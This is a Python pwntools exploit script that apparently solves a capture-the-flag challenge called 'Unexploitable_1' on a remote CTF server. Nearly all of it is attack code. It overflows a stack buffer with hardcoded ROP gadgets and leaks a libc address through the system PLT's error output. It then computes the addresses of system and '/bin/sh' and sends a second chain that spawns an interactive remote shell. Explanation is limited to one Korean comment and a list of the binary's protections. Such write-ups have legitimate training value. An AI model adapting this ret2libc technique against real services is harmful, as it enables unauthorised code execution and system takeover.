from pwn import *
from Crypto.Util.number import bytes_to_long


r = remote("ctf.j0n9hyun.xyz", 3023)
# r = process("./Unexploitable_1")



lib = ELF("./libc.so.6")
e = ELF("./Unexploitable_1")

'''
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
'''

gift = 0x4006c6
main = 0x4006dc
pr = 0x004007d3
ret = 0x00400541
fgets_gadget = 0x40074d

# system plt에 /bin/sh 전달

r.recvuntil("plt!\n")

payload  = b""
payload += b"a" * 0x18 # duumy
payload += p64(pr)
payload += p64(0x601028)
payload += p64(0x400560)
payload += p64(main)


r.sendline(payload)
r.recvuntil("sh: 1: ")
sleep(1)

libc = u64(r.recv(6).ljust(8, b"\x00"))

print(hex(libc))

libc_binsh = libc + (next(lib.search(b"/bin/sh")) - lib.symbols['fgets'])
libc_system = libc + lib.symbols['system'] - lib.symbols['fgets']

payload  = b""
payload += b"a" * 0x18
payload += p64(pr)
payload += p64(libc_binsh)
payload += p64(libc_system)

r.sendline(payload)

r.interactive()

# 



